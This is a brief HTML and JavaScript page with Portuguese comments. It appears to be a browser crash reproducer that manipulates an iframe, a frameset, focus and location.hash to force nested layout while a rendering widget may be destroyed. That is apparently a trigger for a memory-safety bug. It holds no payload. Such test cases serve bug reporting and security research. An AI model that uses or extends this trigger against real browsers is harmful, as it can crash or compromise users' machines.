
<style>
  iframe {
    content: url();
    zoom: 0.01;
  }
</style>
<script>
onload = () => {
  const iframe = document.getElementById('i0');
  
  // Força promoção de compositor layer
  iframe.style.willChange = 'transform';

  // Appenda frameset — muda estrutura da render tree
  document.documentElement.append(document.createElement('frameset'));

  // Sequência de operações que forçam relayout aninhado:
  // Cada acesso a offsetWidth força sync layout no frame pai
  // enquanto o iframe interno pode estar sendo re-renderizado
  iframe.onfocus = () => {
    // Forçar layout no momento em que o foco muda
    // pode criar janela onde o RenderWidget é destruído
    void iframe.offsetWidth;     // force layout sync
    location.hash = 'y';
    void iframe.offsetWidth;     // segunda força: RenderWidget pode não existir mais
  };

  location.hash = 'x';

  // Timing assíncrono para dar ao browser tempo de processar
  // o layout inicial antes de focar
  Promise.resolve()
    .then(() => iframe.focus());
};
</script>
<iframe id="i0" tabindex="0"></iframe>
